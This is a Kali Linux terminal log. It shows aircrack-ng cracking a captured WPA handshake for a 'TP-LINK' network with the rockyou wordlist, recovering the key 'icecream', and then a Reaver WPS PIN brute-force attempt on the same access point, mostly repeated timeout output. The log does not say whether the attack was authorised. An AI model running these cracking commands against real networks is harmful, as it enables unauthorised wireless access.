+┌──(user㉿kali)-[~]                                                                                                 
+└─$ ls
+Desktop      hack-01.csv            Pictures        Videos                          wpa_handshake-01.log.csv        
+Documents    hack-01.kismet.csv     Public          wpa_handshake-01.cap                                            
+Downloads    hack-01.kismet.netxml  rockyou.txt     wpa_handshake-01.csv                                            
+flaghasher   hack-01.log.csv        rockyou.txt.gz  wpa_handshake-01.kismet.csv                                     
+hack-01.cap  Music                  Templates       wpa_handshake-01.kismet.netxml                                  
+                                                                                                                    
+┌──(user㉿kali)-[~]                                                                                                 
+└─$ sudo aircrack-ng hack-01.cap -w rockyou.txt                                                                     
+[sudo] password for user:                                                                                           
+Reading packets, please wait...                                                                                     
+Opening hack-01.cap                                                                                                 
+Resetting EAPOL Handshake decoder state.                                                                            
+Resetting EAPOL Handshake decoder state.                                                                            
+Resetting EAPOL Handshake decoder state.                                                                            
+Resetting EAPOL Handshake decoder state.                                                                            
+Read 20603 packets.
+                                                                                                                    
+   #  BSSID              ESSID                     Encryption                                                       
+                                                                                                                    
+   1  E8:DE:27:B0:66:72  TP-LINK                   WPA (1 handshake)                                                
+                                                                                                                    
+Choosing first network as target.                                                                                   
+                                                                                                                    
+Reading packets, please wait...                                                                                     
+Opening hack-01.cap                                                                                                 
+Resetting EAPOL Handshake decoder state.                                                                            
+Resetting EAPOL Handshake decoder state.                                                                            
+Resetting EAPOL Handshake decoder state.                                                                            
+Resetting EAPOL Handshake decoder state.                                                                            
+Read 20603 packets.
+                                                                                                                    
+1 potential targets                                                                                                 
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+
+                               Aircrack-ng 1.7 
+
+      [00:00:00] 682/10303727 keys tested (3298.30 k/s) 
+
+      Time left: 52 minutes, 3 seconds                           0.01%
+
+                           KEY FOUND! [ icecream ]
+
+
+      Master Key     : F6 6E 80 9F 80 20 60 17 29 59 7F 50 0C A7 1D 04 
+                       3A BD 89 F2 A3 14 CA B3 FD 59 CA 20 E1 34 02 29 
+
+      Transient Key  : B9 BC FA 9F A8 10 DF A3 08 F6 09 9C 16 AB BE 4F 
+                       98 0B 5F EC BE BD E6 ED F1 BA 8B 9D 55 76 BF CD 
+                       FB 8F 88 71 C2 D5 93 B4 7E 86 E1 E8 02 EB 39 CD 
+                       50 7E 83 1F E2 63 B6 20 9A CD C1 A1 4D F5 7C C4 
+
+      EAPOL HMAC     : C1 83 B3 68 E5 76 6F AC A7 47 6F B9 23 88 0D F2 
+
+
+
+┌──(user㉿kali)-[~]
+└─$ sudo reaver -bssid E8:DE:27:B0:66:72 --channel 11 -interface wlan0mon -vvv --no-associate
+
+Reaver v1.6.6 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Switching nterface to channel 11
+Required Arguments:
+        -i, --interface=<wlan>          Name of the monitor-mode interface to use
+        -b, --bssid=<mac>               BSSID of the target AP
+
+Optional Arguments:
+        -m, --mac=<mac>                 MAC of the host system
+        -e, --essid=<ssid>              ESSID of the target AP
+        -c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)
+        -s, --session=<file>            Restore a previous session file
+        -C, --exec=<command>            Execute the supplied command upon successful pin recovery
+        -f, --fixed                     Disable channel hopping
+        -5, --5ghz                      Use 5GHz 802.11 channels
+        -v, --verbose                   Display non-critical warnings (-vv or -vvv for more)
+        -q, --quiet                     Only display critical messages
+        -h, --help                      Show help
+
+Advanced Options:
+        -p, --pin=<wps pin>             Use the specified pin (may be arbitrary string or 4/8 digit WPS pin)
+        -d, --delay=<seconds>           Set the delay between pin attempts [1]
+        -l, --lock-delay=<seconds>      Set the time to wait if the AP locks WPS pin attempts [60]
+        -g, --max-attempts=<num>        Quit after num pin attempts
+        -x, --fail-wait=<seconds>       Set the time to sleep after 10 unexpected failures [0]
+        -r, --recurring-delay=<x:y>     Sleep for y seconds every x pin attempts
+        -t, --timeout=<seconds>         Set the receive timeout period [10]
+        -T, --m57-timeout=<seconds>     Set the M5/M7 timeout period [0.40]
+        -A, --no-associate              Do not associate with the AP (association must be done by another application)
+        -N, --no-nacks                  Do not send NACK messages when out of order packets are received
+        -S, --dh-small                  Use small DH keys to improve crack speed
+        -L, --ignore-locks              Ignore locked state reported by the target AP
+        -E, --eap-terminate             Terminate each WPS session with an EAP FAIL packet
+        -J, --timeout-is-nack           Treat timeout as NACK (DIR-300/320)
+        -F, --ignore-fcs                Ignore frame checksum errors
+        -w, --win7                      Mimic a Windows 7 registrar [False]
+        -K, --pixie-dust                Run pixiedust attack
+        -Z                              Run pixiedust attack
+        -O, --output-file=<filename>    Write packets of interest into pcap file
+
+Example:
+        reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv
+
+
+┌──(user㉿kali)-[~]
+└─$ sudo reaver --bssid E8:DE:27:B0:66:72 --channel 11 -interface wlan0mon -vvv --no-associate                      
+
+Reaver v1.6.6 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Switching nterface to channel 11
+[-] Failed to retrieve a MAC address for interface 'nterface'!
+
+┌──(user㉿kali)-[~]
+└─$ sudo reaver --bssid E8:DE:27:B0:66:72 --channel 11 --interface wlan0mon -vvv --no-associate                     
+
+Reaver v1.6.6 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Switching wlan0mon to channel 11
+[+] Waiting for beacon from E8:DE:27:B0:66:72
+[+] Received beacon from E8:DE:27:B0:66:72
+[+] Vendor: AtherosC
+WPS: A new PIN configured (timeout=0)
+WPS: UUID - hexdump(len=16): [NULL]
+WPS: PIN - hexdump_ascii(len=8):
+     31 32 33 34 35 36 37 30                           12345670        
+WPS: Selected registrar information changed
+WPS: Internal Registrar selected (pbc=0)
+WPS: sel_reg_union
+WPS: set_ie
+WPS: cb_set_sel_reg
+WPS: Enter wps_cg_set_sel_reg
+WPS: Leave wps_cg_set_sel_reg early
+WPS: return from wps_selected_registrar_changed
+[+] Trying pin "12345670"
+[+] Associated with E8:DE:27:B0:66:72 (ESSID: TP-LINK)
+[+] Sending EAPOL START request
+send_packet called from send_eapol_start() send.c:48
+[+] Received deauth request
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+[!] WARNING: Receive timeout occurred
+[+] Sending EAPOL START request
+send_packet called from send_eapol_start() send.c:48
+[+] Received deauth request
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+[!] Found packet with bad FCS, skipping...
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+[!] WARNING: Receive timeout occurred
+[+] Sending EAPOL START request
+send_packet called from send_eapol_start() send.c:48
+send_packet called from resend_last_packet() send.c:161
+[+] Received deauth request
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+[!] WARNING: Receive timeout occurred
+[+] Sending EAPOL START request
+send_packet called from send_eapol_start() send.c:48
+[+] Received deauth request
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+[!] WARNING: Receive timeout occurred
+[+] Sending EAPOL START request
+send_packet called from send_eapol_start() send.c:48
+[+] Received deauth request
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+send_packet called from resend_last_packet() send.c:161
+^Csend_packet called from send_termination() send.c:142
+
+[+] Nothing done, nothing to save.
+
+┌──(user㉿kali)-[~]
+└─$ 
